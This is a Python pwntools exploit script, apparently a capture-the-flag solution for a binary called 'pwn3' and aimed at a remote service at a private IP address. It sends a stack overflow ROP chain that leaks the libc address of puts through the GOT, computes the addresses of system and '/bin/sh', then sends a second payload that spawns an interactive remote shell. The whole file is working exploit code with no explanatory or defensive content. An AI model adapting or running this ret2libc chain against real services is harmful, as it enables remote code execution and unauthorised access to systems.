#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
# p = process('pwn3')
p = remote("10.4.20.133",9903)
elf = ELF('pwn3')
libc = ELF('libc.so.6')
# libc = ELF('mylibc')

poprdi   = 0x004008b3
a2p6r    = 0x004008a6
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main     = 0x004007B4

raw_input("#################1#################")
# leak libc
payload1 = (
        "A"*8*3,
        p64(a2p6r),
        "B"*8*7,
        p64(poprdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main),
        )
payload1 = ''.join(payload1)

p.recvuntil('input : ')
# gdb.attach(p,"b *0x0400777")
p.sendline(payload1)

puts_libc   = libc.symbols['puts']
system_libc = libc.symbols['system']
binsh_libc  = libc.search('/bin/sh').next()
puts        = u64(p.recvuntil('Give').split('\n')[0][-6:].ljust(8,'\x00'))
system      = puts - puts_libc + system_libc
binsh       = puts - puts_libc + binsh_libc
log.success("puts addr = "   + hex(puts))
log.success("system addr = " + hex(system))
log.success("binsh addr = "  + hex(binsh))

raw_input("#################2#################")
# get shell
payload2 = (
        "C"*8*3,
        p64(a2p6r),
        "D"*8*7,
        p64(poprdi),
        p64(binsh),
        p64(system),
        p64(main),
        )
payload2 = ''.join(payload2)
p.recvuntil('input : ')
p.sendline(payload2)
p.recv()
log.success("enjoy your shell")

p.interactive()
